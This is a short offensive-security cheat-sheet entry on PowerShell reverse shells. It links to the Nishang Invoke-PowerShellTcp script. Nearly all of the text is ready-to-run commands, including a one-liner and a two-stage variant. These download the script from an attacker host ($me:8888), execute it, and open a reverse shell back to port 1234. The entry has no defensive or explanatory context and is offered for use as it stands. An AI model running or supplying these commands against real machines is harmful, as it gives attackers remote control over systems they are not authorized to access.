# powershell

- Powershell reverse shell can be found at [https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). Connect to listener using

```powershell
powershell -c "iex (New-Object Net.WebClient).DownloadString('http://$me:8888/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress $me -Port 1234"
```

Or the same but in stages

```powershell
powershell (New-Object Net.WebClient).Downloadfile('http://$me:8888/Invoke-PowerShellTcp.ps1')
powershell Import-Module ./Invoke-PowerShellTcp.ps1; Invoke-PowershellTcp -Reverse -IPAddress $me -Port 1234
```